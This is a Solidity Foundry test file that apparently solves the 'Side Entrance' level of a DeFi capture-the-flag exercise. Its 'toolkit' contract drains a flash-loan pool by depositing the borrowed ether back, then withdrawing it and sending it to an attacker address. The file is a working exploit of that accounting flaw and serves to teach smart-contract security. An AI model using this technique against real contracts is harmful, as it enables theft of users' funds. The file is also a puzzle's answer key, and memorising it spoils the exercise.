// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {SideEntranceLenderPool} from "../../../src/Contracts/side-entrance/SideEntranceLenderPool.sol";

contract SideEntrance is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;

    Utilities internal utils;
    SideEntranceLenderPool internal sideEntranceLenderPool;
    address payable internal attacker;
    uint256 public attackerInitialEthBalance;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        sideEntranceLenderPool = new SideEntranceLenderPool();
        vm.label(address(sideEntranceLenderPool), "Side Entrance Lender Pool");

        vm.deal(address(sideEntranceLenderPool), ETHER_IN_POOL);

        assertEq(address(sideEntranceLenderPool).balance, ETHER_IN_POOL);

        attackerInitialEthBalance = address(attacker).balance;

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        toolkit tk = new toolkit();
        address(tk).call(abi.encodeWithSelector(toolkit.start.selector, address(sideEntranceLenderPool)));
        address(tk).call(abi.encodeWithSelector(toolkit.steal.selector, address(attacker)));
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        assertEq(address(sideEntranceLenderPool).balance, 0);
        assertGt(attacker.balance, attackerInitialEthBalance);
    }
}

contract toolkit {
    address public p;
    function start(address _pool) public {
        p = _pool;
        _pool.call(abi.encodeWithSelector(SideEntranceLenderPool.flashLoan.selector,1_000e18));
    }

    function execute() external payable {
        p.call{value: 1_000e18}(abi.encodeWithSelector(SideEntranceLenderPool.deposit.selector));
    }

    function steal(address _attacker) public {
        p.call(abi.encodeWithSelector(SideEntranceLenderPool.withdraw.selector));
        _attacker.call{value: 1_000e18}("");
    }
    receive() external payable { }
}